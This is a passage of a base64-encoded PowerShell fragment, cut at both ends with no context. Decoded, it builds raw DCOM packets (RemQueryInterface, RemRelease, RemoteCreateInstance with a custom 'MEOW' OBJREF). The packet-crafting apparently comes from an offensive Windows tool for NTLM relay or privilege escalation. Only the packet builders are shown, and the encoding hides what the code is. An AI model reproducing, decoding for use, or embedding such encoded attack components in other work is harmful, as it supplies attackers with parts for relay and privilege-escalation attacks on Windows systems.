nMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkNCiAgICAkcGFja2V0X0RDT01SZW1RdWVyeUludGVyZmFjZS5BZGQoIkRDT01SZW1RdWVyeUludGVyZmFjZV9WZXJzaW9uTWFqb3IiLFtCeXRlW11dKDB4MDUsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtUXVlcnlJbnRlcmZhY2UuQWRkKCJEQ09NUmVtUXVlcnlJbnRlcmZhY2VfVmVyc2lvbk1pbm9yIixbQnl0ZVtdXSgweDA3LDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbVF1ZXJ5SW50ZXJmYWNlLkFkZCgiRENPTVJlbVF1ZXJ5SW50ZXJmYWNlX0ZsYWdzIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X0RDT01SZW1RdWVyeUludGVyZmFjZS5BZGQoIkRDT01SZW1RdWVyeUludGVyZmFjZV9SZXNlcnZlZCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtUXVlcnlJbnRlcmZhY2UuQWRkKCJEQ09NUmVtUXVlcnlJbnRlcmZhY2VfQ2F1c2FsaXR5SUQiLCRwYWNrZXRfY2F1c2FsaXR5X0lEKQ0KICAgICRwYWNrZXRfRENPTVJlbVF1ZXJ5SW50ZXJmYWNlLkFkZCgiRENPTVJlbVF1ZXJ5SW50ZXJmYWNlX1Jlc2VydmVkMiIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtUXVlcnlJbnRlcmZhY2UuQWRkKCJEQ09NUmVtUXVlcnlJbnRlcmZhY2VfSVBJRCIsJHBhY2tldF9JUElEKQ0KICAgICRwYWNrZXRfRENPTVJlbVF1ZXJ5SW50ZXJmYWNlLkFkZCgiRENPTVJlbVF1ZXJ5SW50ZXJmYWNlX1JlZnMiLFtCeXRlW11dKDB4MDUsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbVF1ZXJ5SW50ZXJmYWNlLkFkZCgiRENPTVJlbVF1ZXJ5SW50ZXJmYWNlX0lJRHMiLFtCeXRlW11dKDB4MDEsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtUXVlcnlJbnRlcmZhY2UuQWRkKCJEQ09NUmVtUXVlcnlJbnRlcmZhY2VfVW5rbm93biIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDEsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbVF1ZXJ5SW50ZXJmYWNlLkFkZCgiRENPTVJlbVF1ZXJ5SW50ZXJmYWNlX0lJRCIsJHBhY2tldF9JSUQpDQoNCiAgICByZXR1cm4gJHBhY2tldF9EQ09NUmVtUXVlcnlJbnRlcmZhY2UNCn0NCg0KZnVuY3Rpb24gR2V0LVBhY2tldERDT01SZW1SZWxlYXNlKCkNCnsNCiAgICBwYXJhbShbQnl0ZVtdXSRwYWNrZXRfY2F1c2FsaXR5X0lELFtCeXRlW11dJHBhY2tldF9JUElELFtCeXRlW11dJHBhY2tldF9JUElEMikNCg0KICAgICRwYWNrZXRfRENPTVJlbVJlbGVhc2UgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQ0KICAgICRwYWNrZXRfRENPTVJlbVJlbGVhc2UuQWRkKCJEQ09NUmVtUmVsZWFzZV9WZXJzaW9uTWFqb3IiLFtCeXRlW11dKDB4MDUsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtUmVsZWFzZS5BZGQoIkRDT01SZW1SZWxlYXNlX1ZlcnNpb25NaW5vciIsW0J5dGVbXV0oMHgwNywweDAwKSkNCiAgICAkcGFja2V0X0RDT01SZW1SZWxlYXNlLkFkZCgiRENPTVJlbVJlbGVhc2VfRmxhZ3MiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbVJlbGVhc2UuQWRkKCJEQ09NUmVtUmVsZWFzZV9SZXNlcnZlZCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtUmVsZWFzZS5BZGQoIkRDT01SZW1SZWxlYXNlX0NhdXNhbGl0eUlEIiwkcGFja2V0X2NhdXNhbGl0eV9JRCkNCiAgICAkcGFja2V0X0RDT01SZW1SZWxlYXNlLkFkZCgiRENPTVJlbVJlbGVhc2VfUmVzZXJ2ZWQyIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X0RDT01SZW1SZWxlYXNlLkFkZCgiRENPTVJlbVJlbGVhc2VfVW5rbm93biIsW0J5dGVbXV0oMHgwMiwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtUmVsZWFzZS5BZGQoIkRDT01SZW1SZWxlYXNlX0ludGVyZmFjZVJlZnMiLFtCeXRlW11dKDB4MDIsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbVJlbGVhc2UuQWRkKCJEQ09NUmVtUmVsZWFzZV9JUElEIiwkcGFja2V0X0lQSUQpDQogICAgJHBhY2tldF9EQ09NUmVtUmVsZWFzZS5BZGQoIkRDT01SZW1SZWxlYXNlX1B1YmxpY1JlZnMiLFtCeXRlW11dKDB4MDUsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbVJlbGVhc2UuQWRkKCJEQ09NUmVtUmVsZWFzZV9Qcml2YXRlUmVmcyIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtUmVsZWFzZS5BZGQoIkRDT01SZW1SZWxlYXNlX0lQSUQyIiwkcGFja2V0X0lQSUQyKQ0KICAgICRwYWNrZXRfRENPTVJlbVJlbGVhc2UuQWRkKCJEQ09NUmVtUmVsZWFzZV9QdWJsaWNSZWZzMiIsW0J5dGVbXV0oMHgwNSwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtUmVsZWFzZS5BZGQoIkRDT01SZW1SZWxlYXNlX1ByaXZhdGVSZWZzMiIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQoNCiAgICByZXR1cm4gJHBhY2tldF9EQ09NUmVtUmVsZWFzZQ0KfQ0KDQpmdW5jdGlvbiBHZXQtUGFja2V0RENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlKCkNCnsNCiAgICBwYXJhbShbQnl0ZVtdXSRwYWNrZXRfY2F1c2FsaXR5X0lELFtTdHJpbmddJHBhY2tldF90YXJnZXQpDQoNCiAgICBbQnl0ZVtdXSRwYWNrZXRfdGFyZ2V0X3VuaWNvZGUgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldEJ5dGVzKCRwYWNrZXRfdGFyZ2V0KQ0KICAgIFtCeXRlW11dJHBhY2tldF90YXJnZXRfbGVuZ3RoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcGFja2V0X3RhcmdldC5MZW5ndGggKyAxKQ0KICAgICRwYWNrZXRfdGFyZ2V0X3VuaWNvZGUgKz0gLDB4MDAgKiAoKFtNYXRoXTo6VHJ1bmNhdGUoJHBhY2tldF90YXJnZXRfdW5pY29kZS5MZW5ndGggLyA4ICsgMSkgKiA4KSAtICRwYWNrZXRfdGFyZ2V0X3VuaWNvZGUuTGVuZ3RoKQ0KICAgIFtCeXRlW11dJHBhY2tldF9jbnRkYXRhID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcGFja2V0X3RhcmdldF91bmljb2RlLkxlbmd0aCArIDcyMCkNCiAgICBbQnl0ZVtdXSRwYWNrZXRfc2l6ZSA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJHBhY2tldF90YXJnZXRfdW5pY29kZS5MZW5ndGggKyA2ODApDQogICAgW0J5dGVbXV0kcGFja2V0X3RvdGFsX3NpemUgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRwYWNrZXRfdGFyZ2V0X3VuaWNvZGUuTGVuZ3RoICsgNjY0KQ0KICAgIFtCeXRlW11dJHBhY2tldF9wcml2YXRlX2hlYWRlciA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJHBhY2tldF90YXJnZXRfdW5pY29kZS5MZW5ndGggKyA0MCkgKyAweDAwLDB4MDAsMHgwMCwweDAwDQogICAgW0J5dGVbXV0kcGFja2V0X3Byb3BlcnR5X2RhdGFfc2l6ZSA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJHBhY2tldF90YXJnZXRfdW5pY29kZS5MZW5ndGggKyA1NikNCg0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9EQ09NVmVyc2lvbk1ham9yIixbQnl0ZVtdXSgweDA1LDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0RDT01WZXJzaW9uTWlub3IiLFtCeXRlW11dKDB4MDcsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfRENPTUZsYWdzIixbQnl0ZVtdXSgweDAxLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9EQ09NUmVzZXJ2ZWQiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0RDT01DYXVzYWxpdHlJRCIsJHBhY2tldF9jYXVzYWxpdHlfSUQpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfVW5rbm93biIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfVW5rbm93bjIiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX1Vua25vd24zIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMiwweDAwKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9Vbmtub3duNCIsJHBhY2tldF9jbnRkYXRhKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ250RGF0YSIsJHBhY2tldF9jbnRkYXRhKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzT0JKUkVGU2lnbmF0dXJlIixbQnl0ZVtdXSgweDRkLDB4NDUsMHg0ZiwweDU3KSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc09CSlJFRkZsYWdzIixbQnl0ZVtdXSgweDA0LDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc09CSlJFRklJRCIsW0J5dGVbXV0oMHhhMiwweDAxLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4YzAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0NikpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZDTFNJRCIsW0J5dGVbXV0oMHgzOCwweDAzLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4YzAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0NikpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZDQkV4dGVuc2lvbiIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZTaXplIiwkcGFja2V0X3NpemUpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1RvdGFsU2l6ZSIsJHBhY2tldF90b3RhbF9zaXplKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNSZXNlcnZlZCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc0N1c3RvbUhlYWRlckNvbW1vbkhlYWRlciIsW0J5dGVbXV0oMHgwMSwweDEwLDB4MDgsMHgwMCwweGNjLDB4Y2MsMHhjYywweGNjKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzQ3VzdG9tSGVhZGVyUHJpdmF0ZUhlYWRlciIsW0J5dGVbXV0oMHhiMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzQ3VzdG9tSGVhZGVyVG90YWxTaXplIiwkcGFja2V0X3RvdGFsX3NpemUpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc0N1c3RvbUhlYWRlckN1c3RvbUhlYWRlclNpemUiLFtCeXRlW11dKDB4YzAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNDdXN0b21IZWFkZXJSZXNlcnZlZCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc0Rlc3RpbmF0aW9uQ29udGV4dCIsW0J5dGVbXV0oMHgwMiwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc051bUFjdGl2YXRpb25Qcm9wZXJ0eVN0cnVjdHMiLFtCeXRlW11dKDB4MDYsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNDbHNJbmZvQ2xzaWQiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNDbHNJZFB0clJlZmVyZW50SUQiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAyLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNDbHNTaXplc1B0clJlZmVyZW50SUQiLFtCeXRlW11dKDB4MDQsMHgwMCwweDAyLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNOVUxMUG9pbnRlciIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc0Nsc0lkUHRyTWF4Q291bnQiLFtCeXRlW11dKDB4MDYsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNDbHNJZFB0clByb3BlcnR5U3RydWN0R3VpZCIsW0J5dGVbXV0oMHhiOSwweDAxLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4YzAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0NikpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc0Nsc0lkUHRyUHJvcGVydHlTdHJ1Y3RHdWlkMiIsW0J5dGVbXV0oMHhhYiwweDAxLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4YzAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0NikpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc0Nsc0lkUHRyUHJvcGVydHlTdHJ1Y3RHdWlkMyIsW0J5dGVbXV0oMHhhNSwweDAxLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4YzAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0NikpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc0Nsc0lkUHRyUHJvcGVydHlTdHJ1Y3RHdWlkNCIsW0J5dGVbXV0oMHhhNiwweDAxLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4YzAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0NikpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc0Nsc0lkUHRyUHJvcGVydHlTdHJ1Y3RHdWlkNSIsW0J5dGVbXV0oMHhhNCwweDAxLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4YzAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0NikpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc0Nsc0lkUHRyUHJvcGVydHlTdHJ1Y3RHdWlkNiIsW0J5dGVbXV0oMHhhYSwweDAxLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4YzAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0NikpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc0Nsc1NpemVzUHRyTWF4Q291bnQiLFtCeXRlW11dKDB4MDYsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNDbHNTaXplc1B0clByb3BlcnR5RGF0YVNpemUiLFtCeXRlW11dKDB4NjgsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNDbHNTaXplc1B0clByb3BlcnR5RGF0YVNpemUyIixbQnl0ZVtdXSgweDU4LDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzQ2xzU2l6ZXNQdHJQcm9wZXJ0eURhdGFTaXplMyIsW0J5dGVbXV0oMHg5MCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc0Nsc1NpemVzUHRyUHJvcGVydHlEYXRhU2l6ZTQiLCRwYWNrZXRfcHJvcGVydHlfZGF0YV9zaXplKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNDbHNTaXplc1B0clByb3BlcnR5RGF0YVNpemU1IixbQnl0ZVtdXSgweDIwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzQ2xzU2l6ZXNQdHJQcm9wZXJ0eURhdGFTaXplNiIsW0J5dGVbXV0oMHgzMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNTcGVjaWFsU3lzdGVtUHJvcGVydGllc0NvbW1vbkhlYWRlciIsW0J5dGVbXV0oMHgwMSwweDEwLDB4MDgsMHgwMCwweGNjLDB4Y2MsMHhjYywweGNjKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzUHJvcGVydGllc1NwZWNpYWxTeXN0ZW1Qcm9wZXJ0aWVzUHJpdmF0ZUhlYWRlciIsW0J5dGVbXV0oMHg1OCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzUHJvcGVydGllc1NwZWNpYWxTeXN0ZW1Qcm9wZXJ0aWVzU2Vzc2lvbklEIixbQnl0ZVtdXSgweGZmLDB4ZmYsMHhmZiwweGZmKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzUHJvcGVydGllc1NwZWNpYWxTeXN0ZW1Qcm9wZXJ0aWVzUmVtb3RlVGhpc1Nlc3Npb25JRCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNTcGVjaWFsU3lzdGVtUHJvcGVydGllc0NsaWVudEltcGVyc29uYXRpbmciLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzU3BlY2lhbFN5c3RlbVByb3BlcnRpZXNQYXJ0aXRpb25JRFByZXNlbnQiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDA